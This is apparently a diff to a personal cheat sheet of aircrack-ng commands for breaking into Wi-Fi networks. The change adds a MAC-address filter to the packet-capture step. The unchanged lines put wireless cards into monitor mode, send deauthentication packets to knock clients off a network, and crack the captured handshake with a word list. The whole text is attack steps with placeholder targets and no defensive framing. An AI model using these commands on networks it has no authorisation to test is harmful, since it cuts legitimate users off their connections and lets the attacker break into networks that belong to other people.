@@ -2,6 +2,6 @@ lsusb
 ifconfig iwconfig
 airmon-ng start wlan0
 airodump-ng wlan0
-airodump-ng -c[ ] -w [file name] wlan0
+airodump-ng -c[ ] -w [file name] -d [mac address] wlan0
 aireplay-ng --deauth [times] -a [wifi address] -c [client] wlan0
 aircrack-ng [.cap file] -w [word list]
